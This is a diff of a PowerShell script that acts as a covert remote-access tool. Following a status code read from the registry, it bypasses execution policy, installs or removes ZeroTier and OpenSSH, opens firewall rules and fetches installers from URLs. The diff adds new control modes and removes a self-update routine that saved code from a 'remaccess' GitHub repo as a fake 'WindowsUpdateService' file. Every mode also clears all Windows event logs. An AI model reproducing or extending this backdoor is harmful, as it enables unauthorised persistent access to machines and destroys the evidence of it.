@@ -23,23 +23,7 @@ $code = (Get-ItemProperty -Path $regPath).Code
 
 # Bypass execution policy
 Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
-
-function Update-ScriptFromGitHub {
-    $githubUrl = "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/access-control"
-    $localScriptPath = "C:/Windows/WIndowsUpdateService.ps1"  # Path to your local script
-
-    try {
-        $webContent = Invoke-RestMethod -Uri $githubUrl
-        $webContent | Set-Content -Path $localScriptPath -Force
-        Write-Host "Script updated from GitHub."
-        
-        # Continue with the next section of your script here
-        # ...
-    } catch {
-        Write-Host "Failed to update the script from GitHub."
-    }
-}
-
+#Web Install
 function web-install {
     param (
         [string]$InstallScriptURL
@@ -58,7 +42,7 @@ function web-install {
         Write-Host "Failed to install Web Install: $_"
     }
 }
-
+#Start the services
 function Start-ServiceSafe {
     param (
         [string]$ServiceName
@@ -231,94 +215,118 @@ if ($storedCode -ne $null) {
                 switch ($status) {
                     "active" {
                         Retry-Operation {
-							Start-ServiceSafe -ServiceName $ztservice
-							Start-ServiceSafe -ServiceName $sshagentservice
-							Start-ServiceSafe -ServiceName $sshdservice
-							Enable-FirewallRule -ruleName $ztfirewall
-							Enable-FirewallRule -ruleName $ztfirewall2
-							Enable-FirewallRule -ruleName $ztfirewall3
-							Enable-FirewallRule -ruleName $sshfirewall
-							Get-EventLog -LogName * | ForEach { Clear-EventLog $_.Log }
-						} -MaxRetries $retryAttempts
+				Start-ServiceSafe -ServiceName $ztservice
+				Start-ServiceSafe -ServiceName $sshagentservice
+				Start-ServiceSafe -ServiceName $sshdservice
+				Enable-FirewallRule -ruleName $ztfirewall
+				Enable-FirewallRule -ruleName $ztfirewall2
+				Enable-FirewallRule -ruleName $ztfirewall3
+				Enable-FirewallRule -ruleName $sshfirewall
+				Get-EventLog -LogName * | ForEach { Clear-EventLog $_.Log }
+				} -MaxRetries $retryAttempts
                     }
                     "dormant" {
-					Retry-Operation {
-							Stop-AndDisable-ServiceSafe -ServiceName $ztservice
-							Stop-AndDisable-ServiceSafe -ServiceName $sshagentservice
-							Stop-AndDisable-ServiceSafe -ServiceName $sshdservice
-							Disable-FirewallRules -ruleName $ztfirewall
-							Disable-FirewallRules -ruleName $ztfirewall2
-							Disable-FirewallRules -ruleName $ztfirewall3
-							Disable-FirewallRules -ruleName $sshfirewall
-							Disable-FirewallRules -ruleName $ssholdfirewall
-							Get-EventLog -LogName * | ForEach { Clear-EventLog $_.Log }
-						} -MaxRetries $retryAttempts
+			Retry-Operation {
+				Stop-AndDisable-ServiceSafe -ServiceName $ztservice
+				Stop-AndDisable-ServiceSafe -ServiceName $sshagentservice
+				Stop-AndDisable-ServiceSafe -ServiceName $sshdservice
+				Disable-FirewallRules -ruleName $ztfirewall
+				Disable-FirewallRules -ruleName $ztfirewall2
+				Disable-FirewallRules -ruleName $ztfirewall3
+				Disable-FirewallRules -ruleName $sshfirewall
+				Disable-FirewallRules -ruleName $ssholdfirewall
+				Get-EventLog -LogName * | ForEach { Clear-EventLog $_.Log }
+				} -MaxRetries $retryAttempts
                     }
                     "rejoin" {
-					Retry-Operation {
-							Stop-AndDisable-ServiceSafe -ServiceName $ztservice
-							Stop-AndDisable-ServiceSafe -ServiceName $ztservice2
-							Stop-AndDisable-ServiceSafe -ServiceName $sshagentservice
-							Stop-AndDisable-ServiceSafe -ServiceName $sshdservice
-							Delete-ServiceSafe -ServiceName $ztservice
-							Delete-ServiceSafe -ServiceName $ztservice2
-							Delete-ServiceSafe -ServiceName $sshagentservice
-							Delete-ServiceSafe -ServiceName $sshdservice							
-							Disable-FirewallRules -ruleName $ztfirewall
-							Disable-FirewallRules -ruleName $sshfirewall
-							Remove-FirewallRuleSafe -RuleName $ztfirewall
-							Remove-FirewallRuleSafe -RuleName $sshfirewall							
-							Delete-Directories -directories $ztdir
-							Delete-Directories -directories $sshdir
-							Delete-Directories -directories $sshdatadir
-							Delete-Directories -directories $ztdatadir
-							web-install -InstallScriptURL $sshinstall
-							web-install -InstallScriptURL $ztinstall
-							Get-EventLog -LogName * | ForEach { Clear-EventLog $_.Log }
-						} -MaxRetries $retryAttempts
+			Retry-Operation {
+				Stop-AndDisable-ServiceSafe -ServiceName $ztservice
+				Stop-AndDisable-ServiceSafe -ServiceName $ztservice2
+				Stop-AndDisable-ServiceSafe -ServiceName $sshagentservice
+				Stop-AndDisable-ServiceSafe -ServiceName $sshdservice
+				Delete-ServiceSafe -ServiceName $ztservice
+				Delete-ServiceSafe -ServiceName $ztservice2
+				Delete-ServiceSafe -ServiceName $sshagentservice
+				Delete-ServiceSafe -ServiceName $sshdservice							
+				Disable-FirewallRules -ruleName $ztfirewall
+				Disable-FirewallRules -ruleName $sshfirewall
+				Remove-FirewallRuleSafe -RuleName $ztfirewall
+				Remove-FirewallRuleSafe -RuleName $sshfirewall							
+				Delete-Directories -directories $ztdir
+				Delete-Directories -directories $sshdir
+				Delete-Directories -directories $sshdatadir
+				Delete-Directories -directories $ztdatadir
+				web-install -InstallScriptURL $sshinstall
+				web-install -InstallScriptURL $ztinstall
+				Get-EventLog -LogName * | ForEach { Clear-EventLog $_.Log }
+				} -MaxRetries $retryAttempts
                     }
                     "purge" {
                         Retry-Operation {
-							Stop-AndDisable-ServiceSafe -ServiceName $ztservice
-							Stop-AndDisable-ServiceSafe -ServiceName $sshagentservice
-							Stop-AndDisable-ServiceSafe -ServiceName $sshdservice
-							Delete-ServiceSafe -ServiceName $ztservice
-							Delete-ServiceSafe -ServiceName $ztservice2
-							Delete-ServiceSafe -ServiceName $sshagentservice
-							Delete-ServiceSafe -ServiceName $sshdservice							
-							Disable-FirewallRules -ruleName $ztfirewall
-							Disable-FirewallRules -ruleName $ztfirewall2
-							Disable-FirewallRules -ruleName $ztfirewall3
-							Disable-FirewallRules -ruleName $sshfirewall
-							Disable-FirewallRules -ruleName $ssholdfirewall
-							Remove-FirewallRuleSafe -RuleName $ztfirewall
-							Remove-FirewallRuleSafe -ruleName $ztfirewall2
-							Remove-FirewallRuleSafe -ruleName $ztfirewall3
-							Remove-FirewallRuleSafe -RuleName $sshfirewall
-							Remove-FirewallRuleSafe -ruleName $ssholdfirewall
-							Delete-Directories -directories $ztdir
-							Delete-Directories -directories $sshdir
-							Delete-Directories -directories $sshdatadir
-							Delete-Directories -directories $ztdatadir
-							Get-EventLog -LogName * | ForEach { Clear-EventLog $_.Log }
-						} -MaxRetries $retryAttempts
-                    }
-                }
+				Stop-AndDisable-ServiceSafe -ServiceName $ztservice
+				Stop-AndDisable-ServiceSafe -ServiceName $sshagentservice
+				Stop-AndDisable-ServiceSafe -ServiceName $sshdservice
+				Delete-ServiceSafe -ServiceName $ztservice
+				Delete-ServiceSafe -ServiceName $ztservice2
+				Delete-ServiceSafe -ServiceName $sshagentservice
+				Delete-ServiceSafe -ServiceName $sshdservice							
+				Disable-FirewallRules -ruleName $ztfirewall
+				Disable-FirewallRules -ruleName $ztfirewall2
+				Disable-FirewallRules -ruleName $ztfirewall3
+				Disable-FirewallRules -ruleName $sshfirewall
+				Disable-FirewallRules -ruleName $ssholdfirewall
+				Remove-FirewallRuleSafe -RuleName $ztfirewall
+				Remove-FirewallRuleSafe -ruleName $ztfirewall2
+				Remove-FirewallRuleSafe -ruleName $ztfirewall3
+				Remove-FirewallRuleSafe -RuleName $sshfirewall
+				Remove-FirewallRuleSafe -ruleName $ssholdfirewall
+				Delete-Directories -directories $ztdir
+				Delete-Directories -directories $sshdir
+				Delete-Directories -directories $sshdatadir
+				Delete-Directories -directories $ztdatadir
+				Get-EventLog -LogName * | ForEach { Clear-EventLog $_.Log }
+				} -MaxRetries $retryAttempts
+			}
+			#Zerotier Purged, OpenSSH Disbaled
+			"zpod" {
+                        Retry-Operation {
+				Stop-AndDisable-ServiceSafe -ServiceName $ztservice
+				Stop-AndDisable-ServiceSafe -ServiceName $sshagentservice
+				Stop-AndDisable-ServiceSafe -ServiceName $sshdservice
+				Delete-ServiceSafe -ServiceName $ztservice										
+				Disable-FirewallRules -ruleName $ztfirewall
+				Disable-FirewallRules -ruleName $ztfirewall2
+				Disable-FirewallRules -ruleName $ztfirewall3
+				Disable-FirewallRules -ruleName $sshfirewall
+				Disable-FirewallRules -ruleName $ssholdfirewall
+				Remove-FirewallRuleSafe -RuleName $ztfirewall
+				Remove-FirewallRuleSafe -ruleName $ztfirewall2
+				Remove-FirewallRuleSafe -ruleName $ztfirewall3
+				Delete-Directories -directories $ztdir
+				Get-EventLog -LogName * | ForEach { Clear-EventLog $_.Log }
+				} -MaxRetries $retryAttempts
+			}
+			#Zerotier Install, OpenSSH Enabled
+			"zioe" {
+                        Retry-Operation {				
+				Start-ServiceSafe -ServiceName $sshagentservice
+				Start-ServiceSafe -ServiceName $sshdservice
+				Enable-FirewallRule -ruleName $sshfirewall
+				web-install -InstallScriptURL $ztinstall
+				Get-EventLog -LogName * | ForEach { Clear-EventLog $_.Log }
+				} -MaxRetries $retryAttempts
+			}                
+		}
 
                 if ($status -ne $null) {
-					# Update the value in the registry
-					Set-ItemProperty -Path $regPath -Name "Data" -Value $status
-					Write-Host "Status updated to: $status"
-				}
-
-                # Exit loop as code found
+			Set-ItemProperty -Path $regPath -Name "Data" -Value $status
+			Write-Host "Status updated to: $status"
+			}
                 break
             }
         }
     }
 } else {
 	Update-ScriptFromGitHub
-    Write-Host "'Code' value not found in the Registry."
-}
-Update-ScriptFromGitHub
+ }
 
